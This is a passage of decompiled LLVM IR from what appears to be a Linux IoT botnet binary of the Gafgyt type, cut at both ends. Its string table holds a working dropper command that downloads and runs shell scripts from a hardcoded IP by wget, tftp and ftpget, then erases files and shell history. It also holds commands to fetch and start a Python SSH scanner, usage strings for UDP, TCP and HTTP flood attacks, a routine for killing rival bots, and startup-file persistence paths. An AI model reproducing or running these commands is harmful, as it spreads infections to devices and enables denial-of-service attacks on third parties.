@global_var_805e270.596, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_805e2e0.597, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_805d69c.563, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805e378.598, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805ebcc.617, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_805ec16.618, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805ec2c.619, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805eca0.620, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @global_var_805ed14.621, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805e3c4.599, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805e444.600, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_805e4c4.601, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_805e544.602, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805e5c4.603, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_805e644.604, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_805e6c4.605, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_805e73c.606, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_805e7a8.607, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @global_var_805e81c.608, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @global_var_805e89c.609, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805840c.321, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805d00c.544, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_805e8d8.610, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_805e920.611, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_805ccd8.536, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @global_var_805e964.612, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_805ea34.613, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_805c654.519, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_805ea90.614, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_805c9ac.528, i32 0, i32 0)]
@global_var_805f7dc.626 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_805f81c.627 = constant [410 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.233.43/miggs.sh; chmod 777 miggs.sh; sh miggs.sh; tftp 94.177.233.43 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.177.233.43; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.177.233.43 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf miggs.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c\00"
@global_var_805f9b6.628 = constant [4 x i8] c"%d\0A\00"
@global_var_805f9ba.629 = constant [7 x i8] c"PYTHON\00"
@global_var_805f9c1.630 = constant [8 x i8] c"INSTALL\00"
@global_var_805f9cc.631 = constant [141 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 94.177.233.43  2       /good2.py\00"
@global_var_805fa59.632 = constant [26 x i8] c"INSTALLING PYTHON SCANNER\00"
@global_var_805fa73.633 = constant [7 x i8] c"UPDATE\00"
@global_var_805fa7c.634 = constant [58 x i8] c"cd /.tmp;rm -rf *py;wget 94.177.233.43  2       /good2.py\00"
@global_var_805fab6.635 = constant [24 x i8] c"UPDATING PYTHON SCANNER\00"
@global_var_805face.636 = constant [4 x i8] c"OFF\00"
@global_var_805fad4.637 = constant [31 x i8] c"killall -9 python;pkill python\00"
@global_var_805faf3.638 = constant [24 x i8] c"STOPPING PYTHON SCANNER\00"
@global_var_805fb0b.639 = constant [6 x i8] c"START\00"
@global_var_805fb14.640 = constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00"
@global_var_805fb3c.641 = constant [28 x i8] c"STARTING VOIDS HACKA SCANNA\00"
@global_var_805fb58.642 = constant [6 x i8] c"PONG!\00"
@global_var_805fb5e.643 = constant [6 x i8] c"TABLE\00"
@global_var_805fb64.644 = constant [3 x i8] c"%d\00"
@global_var_805fb67.645 = constant [25 x i8] c"UPDATE TAKEN SUCCESFULLY\00"
@global_var_805fb80.646 = constant [8 x i8] c"SCANNER\00"
@global_var_8068810.647 = local_unnamed_addr global i32 0
@global_var_805fb88.648 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_805fb99.649 = constant [3 x i8] c"ON\00"
@global_var_805fb9c.650 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_805fbb6.651 = constant [6 x i8] c"NETIS\00"
@global_var_805fbbc.652 = constant [23 x i8] c"STOPPING NETIS SCANNER\00"
@global_var_805fbd3.653 = constant [23 x i8] c"STARTING NETIS SCANNER\00"
@global_var_805fbea.654 = constant [8 x i8] c"REMOVER\00"
@global_var_805fbf2.655 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_805fc0f.656 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_805fc1b.657 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_805fc2c.658 = constant [4 x i8] c"UDP\00"
@global_var_805fc30.659 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_805fca1.660 = constant [4 x i8] c"TCP\00"
@global_var_805fca8.661 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_805fd62.662 = constant [5 x i8] c"HTTP\00"
@global_var_805fd67.663 = constant [4 x i8] c"CNC\00"
@global_var_805fd6b.664 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_805fd86.665 = constant [4 x i8] c"STD\00"
@global_var_805fd8a.666 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_805fda5.667 = constant [9 x i8] c"KILLATTK\00"
@global_var_805fdae.668 = constant [11 x i8] c"Killed %d.\00"
@global_var_805fdb9.669 = constant [13 x i8] c"None Killed.\00"
@global_var_805fdc6.670 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_806219c.671 = local_unnamed_addr global i32 -1
@global_var_8062198.672 = global [18 x i8]* @global_var_80572cf.312
@global_var_805fdd0.673 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805fdd8.674 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805fde8.675 = constant [11 x i8] c"\0900000000\09\00"
@global_var_805fdf3.677 = constant [11 x i8] c"PROMETHEUS\00"
@global_var_805fdfe.678 = constant i32 1952788224
@global_var_805fdff.679 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1697579122
@global_var_805fe14.681 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_805fe23.683 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_805fe2b.684 = constant i32 1868955745
@global_var_805fe2d.685 = constant [13 x i8] c"fork failed\0A\00"
@global_var_805fe3a.686 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_805fe46.687 = constant [5 x i8] c"PONG\00"
@global_var_805fe4b.688 = constant [4 x i8] c"DUP\00"
@global_var_805fe4f.689 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_805fe63.690 = constant [3 x i8] c"SH\00"
@global_var_805fe66.691 = constant [8 x i8] c"%s 2>&1\00"
@global_var_805fe6e.692 = constant [3 x i8] c"%s\00"
@global_var_805fe71.693 = constant i32 32
@global_var_80687d0.694 = local_unnamed_addr global i32 0
@global_var_80622cc = external local_unnamed_addr global i32
@global_var_80687e0.700 = global i32 0
@global_var_8062308.701 = global i32 0
@global_var_80665a4.702 = local_unnamed_addr global i32 0
@global_var_80665a8.703 = local_unnamed_addr global i32 0
@global_var_8062320.704 = local_unnamed_addr global i32 2
@global_var_80622f0.705 = global i32 0
@global_var_80622ec.706 = global i32* bitcast (i16* @global_var_8062340.697 to i32*)
@global_var_8060480.707 = constant i32 0
@global_var_8060498.708 = constant [6 x i8] c"(nil)\00"
@global_var_806049e.709 = constant [7 x i8] c"(null)\00"
@global_var_80604a5.710 = constant i32 2949163
@global_var_8060512.712 = constant i32 327688
@global_var_806050a.713 = constant [8 x i8] c" +0-#'I\00"
@global_var_80604b8.714 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80604f5.715 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80604eb.716 = constant i32 117506048
@global_var_80604dc.717 = constant i32 331776
@global_var_8060560.718 = constant [8 x i8] c"Success\00"
@global_var_8060536.719 = constant [15 x i8] c"Unknown error \00"
@global_var_8061460.720 = constant i32 65536
@global_var_8062540.721 = local_unnamed_addr global i32* @global_var_8061460.720
@global_var_80685c0.722 = global i32 0
@global_var_80685c4.723 = global i32 0
@global_var_80685e0.724 = global i32 0
@global_var_80687ac.725 = global i32 0
@global_var_8062548.726 = global i32 0
@global_var_8068c34.727 = local_unnamed_addr global i32 0
@global_var_8068c28.728 = global i32 0
@global_var_8068820.729 = global i32 0
@global_var_8062430.730 = global i32 0
@global_var_80688cc.732 = global i32 0
@global_var_80688d0.733 = local_unnamed_addr global i32 0
@global_var_80688d4.734 = global i32 0
@global_var_80688e0.735 = local_unnamed_addr global i32 0
@global_var_8068bd4.736 = global i32 0
@global_var_8068bfc.737 = local_unnamed_addr global i32 0
@global_var_8068bec.738 = local_unnamed_addr global i32 0
@global_var_8068bf0.739 = local_unnamed_addr global i32 0
@global_var_8068bf4.740 = local_unnamed_addr global i32 0
@global_var_8068c10.741 = local_unnamed_addr global i32 0
@global_var_8068bf8.742 = local_unnamed_addr global i32 0
@global_var_8068c04.743 = local_unnamed_addr global i32 0
@global_var_8068c08.744 = local_unnamed_addr global i32 0
@global_var_8068c14.745 = local_unnamed_addr global i32 0
@global_var_8068be8.746 = local_unnamed_addr global i32 0
@global_var_8068be4.748 = local_unnamed_addr global i32 0
@global_var_8068c0c.749 = local_unnamed_addr global i32 0
@global_var_80688dc.750 = local_unnamed_addr global i32 0
@global_var_8062448.751 = global i32 0
@global_var_8062460.753 = global i32 0
@global_var_8062478 = external global i32
@global_var_80624a4.755 = global i32 -1726662223
@global_var_8062480.756 = local_unnamed_addr global i32* @global_var_80624a4.755
@global_var_806247c.757 = global i32* @global_var_80624a4.755
@global_var_80610d4.758 = constant i32 0
@global_var_80610c0.759 = constant i32 0
@global_var_80610e8.760 = constant [3 x i8] c"-c\00"
@global_var_80610f0.761 = constant [3 x i8] c"sh\00"
@global_var_80610eb.762 = constant [8 x i8] c"/bin/sh\00"
@global_var_8062520.763 = global i32 0
@global_var_80687c4.764 = local_unnamed_addr global i32 0
@global_var_80687cc.765 = local_unnamed_addr global i32 0
@global_var_8062000.767 = global i32 -1
@global_var_80541d7.768 = constant i32 -294069
@global_var_80687d4.769 = local_unnamed_addr global i32 0
@global_var_80687d8.770 = local_unnamed_addr global i32 0
@global_var_806134c.771 = constant [10 x i8] c"/dev/null\00"
@global_var_80687c8.773 = local_unnamed_addr global i32 0
@global_var_80543bf.775 = constant i32 1928542531
@global_var_80543e3.776 = constant i32 1928542531
@global_var_8068804.777 = local_unnamed_addr global i32 0
@global_var_80687e4.778 = global i32 0
@global_var_8061670.780 = constant [4 x i8] c"inf\00"
@global_var_8061673.785 = constant i32 1179535616
@global_var_8061680.786 = constant i32 2883630
@global_var_8068c38.790 = local_unnamed_addr global i32 0
@global_var_806173c.791 = constant i32 1697579054
@global_var_8061770.792 = constant i32 1868824690
@global_var_806173e.793 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_806174f.794 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8061767.795 = constant [11 x i8] c"nameserver\00"
@global_var_8061772.796 = constant [7 x i8] c"domain\00"
@global_var_8061779.797 = constant [7 x i8] c"search\00"
@global_var_8068c18.798 = global i32 0
@global_var_8068c3c.799 = local_unnamed_addr global i32 0
@global_var_8068c40.800 = local_unnamed_addr global i32 0
@global_var_8061794.801 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8061791.803 = constant [3 x i8] c"%x\00"
@global_var_80617a5.804 = constant [11 x i8] c"/etc/hosts\00"
@global_var_80617b0.805 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8062560.1 = local_unnamed_addr global i8 0
@global_var_80665a0.13 = external local_unnamed_addr global i8*
@global_var_8062597.38 = local_unnamed_addr global i8 0
@global_var_8062598.39 = local_unnamed_addr global i8 0
@global_var_8062599.40 = local_unnamed_addr global i8 0
@global_var_806259a.41 = local_unnamed_addr global i8 0
@global_var_8062596.155 = local_unnamed_addr global i8 0
@global_var_8062590.676 = external global i8*
@2 = internal constant [2 x i8] c"/\00"
@global_var_805fe21.682 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8062340.697 = global i16 288
@global_var_8062390.698 = local_unnamed_addr global i16 272
@global_var_806052a.711 = external constant i8*
@global_var_80688a0.731 = global i8 0
@global_var_8068c00.747 = local_unnamed_addr global i8 0
@global_var_80687c0.752 = local_unnamed_addr global i8 0
@global_var_80687dc.772 = local_unnamed_addr global i8 0
@global_var_80616a0.783 = constant x86_fp80* null
@global_var_80687e8.787 = external global i8*
@global_var_8068800.788 = local_unnamed_addr global i64 0
@global_var_8062544.789 = local_unnamed_addr global i16 1
@global_var_805fe12.680 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 106359
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8062560.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8062024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8062024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8062024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8062560.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8062024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8062560.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_80617c4.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_8062010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134542848, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134574308, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_80625a0.7, align 32
  %v1_804819d = add i32 %arg1, -1640531527
  store i32 %v1_804819d, i32* @global_var_80625a4.8, align 4
  %v1_80481aa = add i32 %arg1, 1013904242
  store i32 %v1_80481aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80481aa, i32* @global_var_80625a8.9, align 8
  br label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %entry, %dec_label_pc_80481bd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481ed, %dec_label_pc_80481bd ]
  %v1_80481c3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481c3, i32* %eax.global-to-local, align 4
  %v1_80481c6 = mul nuw nsw i32 %v1_80481c3, 4
  %v2_80481c6 = add i32 %v1_80481c6, ptrtoint (i32* @global_var_80625a0.7 to i32)
  %v3_80481c6 = inttoptr i32 %v2_80481c6 to i32*
  %v4_80481c6 = load i32, i32* %v3_80481c6, align 4
  %v1_80481d0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481d0, i32* %eax.global-to-local, align 4
  %v1_80481d3 = mul nuw nsw i32 %v1_80481d0, 4
  %v2_80481d3 = add i32 %v1_80481d3, ptrtoint (i32* @global_var_80625a0.7 to i32)
  %v3_80481d3 = inttoptr i32 %v2_80481d3 to i32*
  %v4_80481d3 = load i32, i32* %v3_80481d3, align 4
  %v2_80481da = xor i32 %v4_80481d3, %v4_80481c6
  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_80625a0.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_80622c4.10, align 4
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_80622c4.10, align 4
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_80625a0.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_80622c0.11, align 64
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_80625a0.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d19 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d19, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.020, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.020 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.020, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.020, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.020, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

